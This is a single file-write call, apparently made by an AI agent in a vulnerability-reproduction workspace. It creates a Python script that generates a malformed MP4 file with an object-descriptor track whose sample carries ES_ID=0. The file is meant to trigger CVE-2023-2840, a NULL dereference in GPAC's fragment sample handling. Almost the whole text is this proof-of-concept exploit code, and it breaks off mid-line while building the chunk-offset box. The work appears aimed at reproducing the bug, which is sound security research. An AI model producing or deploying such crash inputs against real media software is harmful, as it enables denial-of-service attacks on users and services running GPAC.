  write_file with args {'file_path': '/home/ubuntu/PoV/DrillAgent/workspace-sonnet/gpac.cve-2023-2840/round3/gen_testcase_round3.py', 'content': '#!/usr/bin/env python3\n"""\nGenerate an MP4 file with OD track to trigger CVE-2023-2840.\n\nThe vulnerability is in gf_isom_fragment_add_sample_ex when Media_ParseODFrame\nfails but the NULL result is not checked before dereferencing.\n\nStrategy:\n1. Create a minimal but valid MP4 structure that can be parsed\n2. Add an OD track (handler type \'odsm\') with proper ESDS\n3. Include malformed OD sample data that causes Media_ParseODFrame to fail\n   - The OD decoder will fail when trying to parse the malformed OD commands\n   - Specifically, we need invalid OD command structure that passes initial checks\n     but fails during processing (e.g., missing ESID in ESD)\n"""\n\nimport struct\nimport sys\n\ndef write_box(box_type, data):\n    """Write an MP4 box with size + type + data"""\n    size = 8 + len(data)\n    return struct.pack(\'>I\', size) + box_type + data\n\ndef write_fullbox(box_type, version, flags, data):\n    """Write a full box with version and flags"""\n    version_flags = struct.pack(\'>I\', (version << 24) | flags)\n    return write_box(box_type, version_flags + data)\n\n# Build the MP4 structure\n\n# ftyp - File type box\nftyp_data = b\'isom\' + struct.pack(\'>I\', 512) + b\'isom\' + b\'iso2\' + b\'mp41\'\nftyp = write_box(b\'ftyp\', ftyp_data)\n\n# mvhd - Movie header\nmvhd_data = struct.pack(\'>IIIIII\', 0, 0, 1000, 1000, 0x00010000, 0x0100)\nmvhd_data += struct.pack(\'>HII\', 0, 0, 0)\nmvhd_data += struct.pack(\'>IIIIIIIII\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)\nmvhd_data += struct.pack(\'>IIIIII\', 0, 0, 0, 0, 0, 0)\nmvhd_data += struct.pack(\'>I\', 2)  # next_track_ID\nmvhd = write_fullbox(b\'mvhd\', 0, 0, mvhd_data)\n\n# tkhd - Track header for OD track\ntkhd_data = struct.pack(\'>IIIII\', 0, 0, 1, 0, 1000)  # creation, modification, track_ID, reserved, duration\ntkhd_data += struct.pack(\'>IIHHHH\', 0, 0, 0, 0, 0, 0)  # reserved, layer, alternate_group, volume, reserved\ntkhd_data += struct.pack(\'>IIIIIIIII\', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)  # matrix\ntkhd_data += struct.pack(\'>II\', 0, 0)  # width, height\ntkhd = write_fullbox(b\'tkhd\', 0, 0x7, tkhd_data)  # flags: enabled + in movie + in preview\n\n# mdhd - Media header\nmdhd_data = struct.pack(\'>IIIIHH\', 0, 0, 1000, 1000, 0x55c4, 0)  # times, timescale, duration, language, pre_defined\nmdhd = write_fullbox(b\'mdhd\', 0, 0, mdhd_data)\n\n# hdlr - Handler reference (OD handler)\nhdlr_data = struct.pack(\'>I\', 0)  # pre_defined\nhdlr_data += b\'odsm\'  # handler_type - Object Descriptor Stream\nhdlr_data += struct.pack(\'>III\', 0, 0, 0)  # reserved\nhdlr_data += b\'GPAC ISO OD Handler\\x00\'  # name\nhdlr = write_fullbox(b\'hdlr\', 0, 0, hdlr_data)\n\n# nmhd - Null media header (for OD/BIFS tracks)\nnmhd = write_fullbox(b\'nmhd\', 0, 0, b\'\')\n\n# dref - Data reference\nurl_box = write_fullbox(b\'url \', 0, 1, b\'\')  # flags=1: self-contained\ndref_data = struct.pack(\'>I\', 1) + url_box  # entry_count + url\ndref = write_fullbox(b\'dref\', 0, 0, dref_data)\n\n# dinf - Data information\ndinf = write_box(b\'dinf\', dref)\n\n# Create malformed OD sample data that will cause Media_ParseODFrame to fail\n# According to the code, Media_ParseODFrame will fail if:\n# 1. OD decode fails (gf_odf_codec_decode returns error)\n# 2. Missing ESID in ESD (line 347-350 in media_odf.c)\n# 3. Invalid descriptor tags\n# \n# We\'ll create an OD Update command with an ESD that has ESID=0 (missing ESID)\n# This will trigger the error at line 347-350 and cause Media_ParseODFrame to fail\n\n# OD Update command structure:\n# Tag: 0x01 (ObjectDescriptorUpdate)\n# Length: variable (BER encoded)\n# ObjectDescriptors: list of ODs\n\n# Create an OD Update command with invalid structure\nmalformed_od_data = b\'\'\n\n# Tag: 0x01 = GF_ODF_OD_UPDATE_TAG\nmalformed_od_data += b\'\\x01\'\n\n# Length: we\'ll say there\'s data but provide minimal/corrupted content\n# BER encoding: 0x80 | num_bytes, then the bytes\n# Let\'s use a 2-byte length: 0x82 means "length in next 2 bytes"\nmalformed_od_data += b\'\\x82\\x00\\x20\'  # length = 32 bytes\n\n# ObjectDescriptor tag: 0x01 = GF_ODF_OD_TAG\nmalformed_od_data += b\'\\x01\'\nmalformed_od_data += b\'\\x82\\x00\\x1C\'  # length = 28 bytes\n\n# OD ID (10 bits) + URL flag (1 bit) + reserved (5 bits) = 2 bytes\nmalformed_od_data += b\'\\x00\\x01\'  # OD_ID = 1, no URL\n\n# ESD tag: 0x03 = GF_ODF_ESD_TAG\nmalformed_od_data += b\'\\x03\'\nmalformed_od_data += b\'\\x82\\x00\\x16\'  # length = 22 bytes\n\n# ES_ID: 0x0000 - THIS IS THE KEY: ESID=0 will trigger the error check!\nmalformed_od_data += b\'\\x00\\x00\'  # ES_ID = 0 (invalid, will cause error)\n\n# Flags: stream dependence (1), URL (1), OCR (1), priority (5) = 1 byte\nmalformed_od_data += b\'\\x00\'  # no dependencies\n\n# DecoderConfigDescriptor tag: 0x04\nmalformed_od_data += b\'\\x04\'\nmalformed_od_data += b\'\\x82\\x00\\x0F\'  # length = 15\n\n# objectTypeIndication, streamType, etc.\nmalformed_od_data += b\'\\x40\'  # objectTypeIndication = 0x40 (Audio ISO/IEC 14496-3)\nmalformed_od_data += b\'\\x15\'  # streamType = 0x05 (AudioStream) << 2 | upstream=0 | reserved=1\nmalformed_od_data += b\'\\x00\\x00\\x00\'  # bufferSizeDB = 0\nmalformed_od_data += b\'\\x00\\x00\\x00\\x00\'  # maxBitrate = 0\nmalformed_od_data += b\'\\x00\\x00\\x00\\x00\'  # avgBitrate = 0\n\n# DecSpecificInfo tag: 0x05\nmalformed_od_data += b\'\\x05\'\nmalformed_od_data += b\'\\x00\'  # length = 0 (no decoder specific info)\n\n# SLConfigDescriptor tag: 0x06\nmalformed_od_data += b\'\\x06\'\nmalformed_od_data += b\'\\x01\'  # length = 1\nmalformed_od_data += b\'\\x02\'  # predefined = 2\n\nod_sample_size = len(malformed_od_data)\n\n# stsd - Sample description (OD sample entry)\nod_entry_data = struct.pack(\'>IHH\', 0, 0, 1)  # reserved[6], data_reference_index\n\n# Create proper ESDS box for the sample description\nesds_data = b\'\'\n# ES_Descriptor tag: 0x03\nesds_data += b\'\\x03\'\nesds_data += b\'\\x80\\x80\\x80\\x19\'  # BER length = 25 bytes\nesds_data += b\'\\x00\\x01\'  # ES_ID = 1\nesds_data += b\'\\x00\'  # flags = 0\n\n# DecoderConfigDescriptor tag: 0x04\nesds_data += b\'\\x04\'\nesds_data += b\'\\x80\\x80\\x80\\x11\'  # BER length = 17 bytes\nesds_data += b\'\\x40\'  # objectTypeIndication = 0x40 (MPEG-4 Systems v1)\nesds_data += b\'\\x01\'  # streamType = 0x01 (ObjectDescriptorStream) << 2\nesds_data += b\'\\x00\\x00\\x00\'  # bufferSizeDB\nesds_data += b\'\\x00\\x00\\x00\\x00\'  # maxBitrate\nesds_data += b\'\\x00\\x00\\x00\\x00\'  # avgBitrate\n\n# DecSpecificInfo tag: 0x05\nesds_data += b\'\\x05\'\nesds_data += b\'\\x80\\x80\\x80\\x00\'  # BER length = 0\n\n# SLConfigDescriptor tag: 0x06\nesds_data += b\'\\x06\'\nesds_data += b\'\\x80\\x80\\x80\\x01\'  # BER length = 1\nesds_data += b\'\\x02\'  # predefined = 2 (reserved for use in MP4 files)\n\nesds_box = write_fullbox(b\'esds\', 0, 0, esds_data)\nod_entry = write_box(b\'mp4s\', od_entry_data + esds_box)\n\nstsd_data = struct.pack(\'>I\', 1) + od_entry  # entry_count + sample entry\nstsd = write_fullbox(b\'stsd\', 0, 0, stsd_data)\n\n# stts - Time to sample\nstts_data = struct.pack(\'>I\', 1)  # entry_count\nstts_data += struct.pack(\'>II\', 1, 1000)  # sample_count, sample_delta\nstts = write_fullbox(b\'stts\', 0, 0, stts_data)\n\n# stsc - Sample to chunk\nstsc_data = struct.pack(\'>I\', 1)  # entry_count\nstsc_data += struct.pack(\'>III\', 1, 1, 1)  # first_chunk, samples_per_chunk, sample_description_index\nstsc = write_fullbox(b\'stsc\', 0, 0, stsc_data)\n\n# stsz - Sample size\nstsz_data = struct.pack(\'>I\', 0)  # sample_size (0 = different sizes)\nstsz_data += struct.pack(\'>I\', 1)  # sample_count\nstsz_data += struct.pack(\'>I\', od_sample_size)  # entry_size[0]\nstsz = write_fullbox(b\'stsz\', 0, 0, stsz_data)\n\n# stco - Chunk offset (will be calculated)\nstco_data = stru